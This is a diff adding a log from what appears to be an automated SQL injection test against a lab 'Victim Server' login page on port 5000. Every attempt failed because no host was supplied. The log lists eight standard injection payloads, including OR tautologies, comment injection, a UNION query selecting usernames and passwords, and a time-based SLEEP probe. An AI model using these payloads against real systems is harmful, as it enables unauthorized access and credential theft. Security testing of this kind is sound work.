@@ -1,0 +1,53 @@
+============================================================
+Attack Type: SQL_Injection
+Timestamp: 2025-10-29_20-33-19
+Target: :5000
+============================================================
+
+[20:33:11] 🔴 ATTACK INITIATED: SQL Injection
+[20:33:11] Target: Victim Server (:5000/login)
+[20:33:11] Testing various SQL injection techniques...
+[20:33:11] 
+[Test 1/8] Authentication Bypass (OR condition)
+[20:33:11]    Payload: ' OR '1'='1
+[20:33:11]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:12] 
+[Test 2/8] Comment Injection
+[20:33:12]    Payload: admin'--
+[20:33:12]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:13] 
+[Test 3/8] UNION-based Injection
+[20:33:13]    Payload: ' UNION SELECT NULL, username, password FROM users--
+[20:33:13]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:14] 
+[Test 4/8] Boolean-based Injection
+[20:33:14]    Payload: ' OR 1=1--
+[20:33:14]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:15] 
+[Test 5/8] Time-based Blind Injection
+[20:33:15]    Payload: admin' AND SLEEP(5)--
+[20:33:15]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:16] 
+[Test 6/8] Alternative OR condition
+[20:33:16]    Payload: ' OR 'a'='a
+[20:33:16]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:17] 
+[Test 7/8] Nested condition bypass
+[20:33:17]    Payload: 1' OR '1' = '1')) --
+[20:33:17]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:18] 
+[Test 8/8] Block comment injection
+[20:33:18]    Payload: admin' /*
+[20:33:18]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:33:19] 
+==================================================
+[20:33:19] 📊 ATTACK SUMMARY
+[20:33:19] ==================================================
+[20:33:19] Total Payloads Tested: 8
+[20:33:19] Exploitable Vulnerabilities: 0
+[20:33:19] Blocked by Firewall: 0
+[20:33:19] Protected/Failed: 8
+[20:33:19] 
+🛡️  Firewall SQL Injection Alerts: 0
+[20:33:19] 
+⏱️  Attack Duration: 8.01 seconds
